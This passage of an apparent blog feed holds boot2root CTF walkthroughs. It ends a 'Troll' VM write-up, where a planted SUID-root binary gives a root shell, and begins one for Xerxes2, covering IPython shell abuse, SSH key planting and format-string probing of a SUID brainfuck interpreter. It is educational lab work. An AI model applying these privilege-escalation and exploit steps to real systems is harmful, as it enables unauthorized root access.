</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot &#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">except</span><span class="p">:</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>I waited for that annoying &lsquo;Times UP&rsquo; message, and inspected <code>/var/tmp</code>:</p>

<figure class='code'><figcaption><span>rooted</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>overflow@troll:/<span class="nv">$ </span>ls -lah /var/tmp/
</span><span class='line'>total 24K
</span><span class='line'>drwxrwxrwt  2 root     root     4.0K Aug 14 13:11 .
</span><span class='line'>drwxr-xr-x 12 root     root     4.0K Aug 10 03:56 ..
</span><span class='line'>-rwxrwxrwx  1 root     root       34 Aug 13 01:16 cleaner.py.swp
</span><span class='line'>-rwsr-xr-x  1 root     root     7.2K Aug 14 13:09 getroot
</span><span class='line'>-rw-rw-r--  1 overflow overflow   71 Aug 14 13:09 sh.c
</span><span class='line'>
</span><span class='line'>overflow@troll:/<span class="nv">$ </span>/var/tmp/getroot
</span><span class='line'><span class="c">#</span>
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>overflow<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>overflow<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ls /root</span>
</span><span class='line'>proof.txt
</span><span class='line'>
</span><span class='line'><span class="c"># cat /root/proof.txt</span>
</span><span class='line'>Good job, you did it!
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>702a8c18d29c6f3ca0d99ef5712bfbdc
</span><span class='line'><span class="c">#</span>
</span></code></pre></td></tr></table></div></figure>


<h2>for the curious</h2>

<p>That really annoying session that keeps dying? Turns out its <code>/opt/lmao.py</code> to blame:</p>

<figure class='code'><figcaption><span>grr</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># cat /opt/lmao.py</span>
</span><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'>
</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;echo &quot;TIMES UP LOL!&quot;|wall&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;pkill -u &#39;overflow&#39;&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># </span>
</span></code></pre></td></tr></table></div></figure>


<p>Thanks <a href="https://twitter.com/maleus21">@maleus21</a> for the VM!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Beating Xerxes 2 (no, not the Persian King)]]></title>
    <link href="http://leonjza.github.io/blog/2014/08/09/beating-xerxes2/"/>
    <updated>2014-08-09T16:59:53+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/08/09/beating-xerxes2</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p>Xerxes2 is a successor in a boot2root series by <a href="https://twitter.com/barrebas">@barrebas</a> hosted by <a href="https://twitter.com/vulnhub">@VulnHub</a>. If you haven&rsquo;t done it yet, close this article <em>now</em> and go learn by doing it!</p>

<p>Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read <code>/root/flag.txt</code>. This is the path I took to read the flag and gain root command execution. Enjoy!</p>

<!--more-->


<h2>getting started</h2>

<p>The tool of choice for Xerxes2 was again Kali Linux. I started up the VM and got the IP Address 192.158.56.102 assigned to it. So, to officially kick off the challenge, I started a NMAP scan:</p>

<figure class='code'><figcaption><span>nmap of 192.168.56.102 (cleaned up)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -v --reason -sV 192.168.56.102 -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-08-09 17:14 SAST
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>PORT      STATE SERVICE REASON  VERSION
</span><span class='line'>22/tcp    open  ssh     syn-ack OpenSSH 6.0p1 Debian 4+deb7u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'>80/tcp    open  http    syn-ack lighttpd 1.4.31
</span><span class='line'>111/tcp   open  rpcbind syn-ack 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
</span><span class='line'>4444/tcp  open  krb524? syn-ack
</span><span class='line'>8888/tcp  open  http    syn-ack Tornado httpd 2.3
</span><span class='line'>57504/tcp open  status  syn-ack 1 <span class="o">(</span>RPC <span class="c">#100024)</span>
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 192.62 seconds
</span><span class='line'>           Raw packets sent: 131149 <span class="o">(</span>5.770MB<span class="o">)</span> <span class="p">|</span> Rcvd: 88 <span class="o">(</span>3.544KB<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well this gives us a boat load to test out already!</p>

<p>I quickly telneted’ to tcp/4444, and got presented with a large string being echoed back. To the eye this looked like a very large base64 string, so I opened <code>nc</code> to the port and redirected the output to a file <code>nc-string</code>. Once the string echoed completely, I quit the <code>nc</code>, and pushed the resultant string through a base64 decode and ran a <code>file</code> against it:</p>

<figure class='code'><figcaption><span>String from tcp/4444</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~#  nc 192.168.56.102 4444 <span class="p">|</span> tee nc-string
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
</span><span class='line'>AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'><span class="nv">qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo</span><span class="o">=</span>
</span><span class='line'>^C
</span><span class='line'>
</span><span class='line'>root@kali:~# cat nc-string <span class="p">|</span> base64 -d &gt; nc-data
</span><span class='line'>root@kali:~# file nc-data
</span><span class='line'>nc-data: MPEG ADTS, layer III, v2,  64 kbps, 22.05 kHz, Monaural
</span></code></pre></td></tr></table></div></figure>


<p><code>nc-data</code> is a, audio file? Ok. I copied the file off Kali Linux, opened it in VLC player and pressed play.</p>

<p><em>(Electronic Noises &amp; Robot Voice)</em> <em>This is Xerxes. Why do you persist in your loneliness?</em> <em>(Electronic Noises)</em></p>

<p>The start and end of the voice message had a clear in &amp; out sound, with some static noises in the background. Then, at the end a strange whistling noise could be heard.</p>

<p>This was the first educational bus ride the Xerxes2 took me on. Learning about the structures of mp3 files etc.</p>

<p>Sadly, this file kept me busy for quite some time, trying to find a hidden message. In the end, I gave up and moved on to the other ports open the VM. Maybe I had to come back to this later, but the little progress I had made had me hope I didn&rsquo;t have to.</p>

<h2>first shell access</h2>

<p>Moving on to tcp/80, a standard website with not much interesting apart from a cool looking Xerxes2 logo was found:</p>

<p><img src="https://i.imgur.com/67BEjmV.png"></p>

<p>However, moving on to tcp/8888, we see it identified as <code>Tornado httpd 2.3</code>. Some of you may recognize Tornado as a python httpd server. So, off to a browser we go!</p>

<p>tcp/8888 hosted a <a href="http://ipython.org/notebook.html">IPython Notebook</a>. We were able to easily create a new note, and abuse the shell command functionality of it for our own purposes. Shell command access could be achieved by prefixing typical shell commands with a <code>!</code>. I used this to enumerate a small bit of the current environment, and quickly decided to add myself a ssh key so that I can play further. So, I generated a new key pair just for Xerxes, and uploaded it for the <code>delacroix</code> user:</p>

<p><img src="https://i.imgur.com/JrTDTPn.png"></p>

<p>And then a easy SSH in:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh -i delacroix delacroix@192.168.56.102
</span><span class='line'>The authenticity of host <span class="s1">&#39;192.168.56.102 (192.168.56.102)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>192.168.56.102<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">Welcome to xerxes2.</span>
</span><span class='line'><span class="s1">      XERXES wishes you</span>
</span><span class='line'><span class="s1">       a pleasant stay.</span>
</span><span class='line'><span class="s1">____   ___  ____  ___  __ ____   ___  ____     ____     ____   </span>
</span><span class='line'><span class="s1">`MM(   )P&#39;</span> 6MMMMb <span class="sb">`</span>MM 6MM <span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb   6MMMMb\  6MMMMb  </span>
</span><span class='line'><span class="s1"> `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM69 <span class="err">&quot;</span>  <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM&#39;</span>    <span class="sb">`</span> MM<span class="s1">&#39;  `Mb </span>
</span><span class='line'><span class="s1">  `MM,P   MM    MM MM&#39;</span>      <span class="sb">`</span>MM,P   MM    MM YM.           ,MM
</span><span class='line'>   <span class="sb">`</span>MM.   MMMMMMMM MM        <span class="sb">`</span>MM.   MMMMMMMM  YMMMMb      ,MM<span class="s1">&#39; </span>
</span><span class='line'><span class="s1">   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;</span>
</span><span class='line'>  d<span class="s1">&#39; `MM. YM    d9 MM       d&#39;</span> <span class="sb">`</span>MM. YM    d9 L    ,MM ,M<span class="err">&#39;</span>
</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
</span><span class='line'>
</span><span class='line'>delacroix@xerxes2:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<h2>becoming polito &ndash; the why</h2>

<p>Once I had the first SSH access, life was a little less complicated. I could enumerate easier and learn the details about what I was facing. Things that stood out was a binary <code>/opt/bf</code>, owned by <code>polito</code> and had the SUID bit set for him. There was also a folder <code>/opt/backup</code>, with a file <code>korenchkin.tar.enc</code>. There was also mail in <code>/var/mail</code> for the user <code>korenchkin</code> which I am not able to read yet.</p>

<p>More interestingly, the <code>.bash_history</code> for the user I am now (delacroix), revealed that the <code>/opt/bf</code> command was recently run, and the sources for this binary was available as <code>bf.c</code>.</p>

<figure class='code'><figcaption><span>delacroix Home and history</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ls -lh
</span><span class='line'>total 8.0K
</span><span class='line'>-rw-r--r-- 1 delacroix delacroix 1.6K Jul 16 12:42 bf.c
</span><span class='line'>-rw-r--r-- 1 delacroix delacroix  100 Aug  9 10:23 Untitled0.ipynb
</span><span class='line'>
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span><span class="nb">history</span>
</span><span class='line'><span class="nb">    </span>1  <span class="nb">cd</span>
</span><span class='line'><span class="nb">    </span>2  ls -alh
</span><span class='line'>    3  /opt/bf <span class="s2">&quot;&lt;&lt;++++[&gt;++++&lt;-]&gt;[&gt;+++++&gt;+++++&gt;+++++&gt;+++++&gt;++&gt;++++&gt;++++&gt;++++&gt;+++++&gt;++++&gt;+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;----&gt;-&gt;-&gt;-----&gt;&gt;++++&gt;+++++&gt;+++++&gt;&gt;+++++&gt;++#&quot;</span>
</span><span class='line'>    4  cp /media/politousb/bf.c .
</span><span class='line'>    5  nano bf.c
</span><span class='line'>    6  <span class="nb">exit</span>
</span><span class='line'><span class="nb">    </span>7  passwd
</span><span class='line'>    8  <span class="nb">exit</span>
</span><span class='line'>
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/opt/bf <span class="s2">&quot;&lt;&lt;++++[&gt;++++&lt;-]&gt;[&gt;+++++&gt;+++++&gt;+++++&gt;+++++&gt;++&gt;++++&gt;++++&gt;++++&gt;+++++&gt;++++&gt;+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;----&gt;-&gt;-&gt;-----&gt;&gt;++++&gt;+++++&gt;+++++&gt;&gt;+++++&gt;++#&quot;</span>
</span><span class='line'>LOOK DEEPERdelacroix@xerxes2:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>As you can see above, running it just prints <strong>LOOK DEEPER</strong>. I recognized the syntax as <a href="http://en.wikipedia.org/wiki/Brainfuck">brainfk</a> and figured that <code>/opt/bf</code> was simply a brainfk interpreter. But wait, lets inspect <code>bf.c</code>!</p>

<h3>inspecting bf.c</h3>

<p>A quick read of <code>bf.c</code> confirmed the suspicions that <code>/opt/bf</code> was simply a brainfk interpreter. A buffer was set for the input program, then a function called <code>bf()</code> was called to process the brainfk program. Each instruction in the brainfk was handled with a case statement:</p>

<figure class='code'><figcaption><span>bf.c brainfk interpreter</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">case</span> <span class="sc">&#39;.&#39;</span>:
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%c&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="k">case</span> <span class="sc">&#39;,&#39;</span>:
</span><span class='line'>    <span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">]</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="k">case</span> <span class="sc">&#39;&gt;&#39;</span>:
</span><span class='line'>    <span class="n">datapointer</span> <span class="o">=</span> <span class="p">(</span><span class="n">datapointer</span> <span class="o">==</span> <span class="p">(</span><span class="n">BUF_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="o">++</span><span class="n">datapointer</span><span class="p">;</span>
</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="k">case</span> <span class="sc">&#39;&lt;&#39;</span>:
</span><span class='line'>    <span class="n">datapointer</span> <span class="o">=</span> <span class="p">(</span><span class="n">datapointer</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="n">BUF_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="o">--</span><span class="n">datapointer</span><span class="p">;</span>
</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="k">case</span> <span class="sc">&#39;+&#39;</span>:
</span><span class='line'>    <span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="k">case</span> <span class="sc">&#39;-&#39;</span>:
</span><span class='line'>    <span class="n">buf</span><span class="p">[</span><span class="n">datapointer</span><span class="p">]</span><span class="o">--</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Soooo, here we started on the second educational bus ride to mount brainfk. In summary, I learnt that I could write a program as simple as <code>,.</code>, and run it with <code>/opt/bf</code>, which will accept a character and then echo it back to me immediately. I also learnt that if you had say, 62 <code>+</code>, and ran that with a brainfk interpreter like <code>/opt/bf</code>, then you would have the character with ASCII value 62 in memory. You can then print that value with <code>.</code>, or move on the next memory cell with a <code>&lt;</code>. The most important thing to learn about brainfk was, <em>there are no high level features. No file IO, no socket IO, nothing</em>.</p>

<p>That was our brainfk class for the day.</p>

<h3>finding the bf vuln</h3>

<p>With all that brainfk, I was still not closer to actually finding the stepping stone to the next part of Xerxes2. That was until I re-read <code>bf.c</code>, and realized that one of the case statements was for <code>#</code>, and that when a hash is present it will run:</p>

<figure class='code'><figcaption><span>bf.c format string vulnerability</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">case</span> <span class="sc">&#39;#&#39;</span>:
</span><span class='line'>    <span class="c1">// new feature</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Classic format string vulnerability!</p>

<p>As exciting as this may seem, it was not really for me. I had already previously struggled with a format string vulnerability, and this case it was present so early in the CTF that I feared I would not be able to complete this one. However, the goal was now clear. I need to <em>somehow</em> exploit this format string vuln, as brainfk, and get that to run my own code, potentially gaining me a shell as <code>polito</code>.</p>

<h2>becoming polito &ndash; the how</h2>

<p>Doing research about format string vulnerabilities, you will see that generally the flow goes something along the lines of:</p>

<ul>
<li>print <code>AAAA%x%x%x%x</code>, adding <code>%s</code> until you see the hex for of A (41), meaning that you are trying to find the position in the stack that <code>printf</code> is placing the arguments.</li>
<li>Test for direct parameter access. Assuming you saw the 41414141 in position 16, test with a payload of <code>AAAA%16$x</code>.</li>
<li><code>objdump -R /your/bin</code> and find a call in the GOT to override.</li>
<li>Place some shellcode as environment variable, ie: <code>EGG</code>, prefixed with say 200 <code>0x90</code>.</li>
<li>use <code>gdb</code>, and find your NOP sled, and choose a position in memory to where you want to override the pointer for a call from the GOT.</li>
<li>Calculate the required padding of strings to get the correct memory address, and write it using the <code>%n</code> format string.</li>
<li>Profit?</li>
</ul>


<p>While this is all fine and dandy, it was not possible for me to <em>profit</em> with this. :( In fact, the there is nothing wrong with the theory, its just that the conditions were slightly different. <code>/opt/bf</code> was compiled with the NX bit, and ASLR is enabled. Oh, and I actually have no idea what I am doing :D</p>

<p>So, let me take this step by step on how <code>/opt/bf</code> can be exploited using a format string vulnerability, encoded in brainfk, with the NX bit set and ASLR enabled.</p>

<h3>/opt/bf &ndash; part1</h3>

<p>To start, I had to recap in the sadly limited knowledge I already have of format string vulnerabilities. Some resources I found useful were:</p>

<ul>
<li><a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></li>
<li><a href="http://codearcana.com/posts/2013/04/28/picoctf-videos.html">http://codearcana.com/posts/2013/04/28/picoctf-videos.html</a></li>
<li><a href="http://youtu.be/NwzmYSlETI8">http://youtu.be/NwzmYSlETI8</a></li>
<li><a href="http://youtu.be/CHrs30g-3O0">http://youtu.be/CHrs30g-3O0</a></li>
</ul>


<p>So, lets work with this.</p>

<p>First of all, the program will only <code>printf(buf)</code> the buffer which is brainfk. This is triggered with a <code>#</code>. For us to be able to do anything even remotely related to brainfk, we need to ensure that our payloads are encoded into brainfk before it gets fed to <code>/opt/bf</code>. Remembering the research that was done, I opted to print as many <code>+</code>&rsquo;s as the ASCII value of the character I wanted, and them simply increment the data cell with <code>&gt;</code>, preparing for the next character.</p>

<p>To test my theory, I prepared my first payload using <code>python -c</code>:</p>

<figure class='code'><figcaption><span>brainfk payload encoding (cleaned up)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span><span class="nb">echo</span> <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;+&quot; * ord(&quot;a&quot;)&#39;</span><span class="k">)</span>
</span><span class='line'>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/opt/bf <span class="s2">&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&quot;</span>
</span><span class='line'>a
</span></code></pre></td></tr></table></div></figure>


<p>That printed the character <code>a</code> as expected. Great! However, we need to be able to print far more character, and multiples too, so lets see if we increment the pointer by 1 will it <code>printf(buf)</code> that too?</p>

<figure class='code'><figcaption><span>brainfk payload encoding multiple characters (cleanedup)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/opt/bf <span class="s2">&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&quot;</span>
</span><span class='line'>aa
</span></code></pre></td></tr></table></div></figure>


<p>2 <code>a</code>! Awesome. So the theory works. However, the last thing I was going to do was copy paste all that crap, so instead, lets write some python and use <a href="https://docs.python.org/2/tutorial/datastructures.html#list-comprehensions">list comprehension</a> to prepare our payloads for <code>/opt/bf</code>:</p>

<figure class='code'><figcaption><span>final brainfk encoding for</span><a href='http://leonjza.github.io/opt/bf'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">print</span> <span class="s">&quot;&gt;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">&quot;+&quot;</span> <span class="o">*</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&quot;the quick brown fox&quot;</span><span class="p">)])</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can copy and paste the above command into a python shell and see the amount of <code>+</code> there are haha.</p>

<p>Anyways, that settled the brainfk problem.</p>

<h3>/opt/bf &ndash; part2</h3>

<p>Now that we can easily provide input to <code>/opt/bf</code> to print using the vulnerable <code>printf()</code> function, it was time to test the actual format string vulnerability. Just like the above mentioned resources (and many many others on the internet) have shown, we provide some <code>AAAA</code> and search for them:</p>

<figure class='code'><figcaption><span>/opt/bf format string testing</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span>AAAA<span class="s2">&quot; + &quot;</span>.%x<span class="s2">&quot; * 20 + &quot;</span><span class="se">\n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
</span><span class='line'>AAAA.b777bff4.0.0.bf842d58.b779b9c0.40.112a.bf83b820.b777bff4.bf842d58.80486eb.bf843860.bf83b820.7530.0.41414141.2e78252e.252e7825.78252e78.2e78252e
</span></code></pre></td></tr></table></div></figure>


<p>Here we are using the previously built brainfk payload generator, and giving it format strings, searching for the <code>AAAA</code> input we have given it. Instead of typing like 20 <code>%s</code>, I just use python to do the hard work for me. As you can see, the string <code>41414141</code> is present in the output. We can test if we are able to use direct parameter access to access just the string we want:</p>

<figure class='code'><figcaption><span>/opt/bf format string direct parameter access</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span>AAAA<span class="s2">&quot; + &quot;</span>.%16<span class="nv">$x</span><span class="s2">&quot; &quot;</span><span class="se">\n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
</span><span class='line'>AAAA.41414141
</span></code></pre></td></tr></table></div></figure>


<p>Yup! Parameter 16 gives us what we need :)</p>

<p>Great. Were making progress&hellip; I think.</p>

<p>For the sake of time, I am not going to document the 412643932471236 attempts that were made at getting this to work. Instead, here is the path that did eventually work. This is the part of Xerxes2 that undoubtedly took me the longest to get right.</p>

<h3>/opt/bf &ndash; part3</h3>

<p>Now that we know where we can start manipulating pointers, we need to find out <em>what</em> we should manipulate. There are many options here, however your decision on which path to take is influenced by many vectors.</p>

<p>First of all, <code>/opt/bf</code> was compiled with the NX bit:</p>

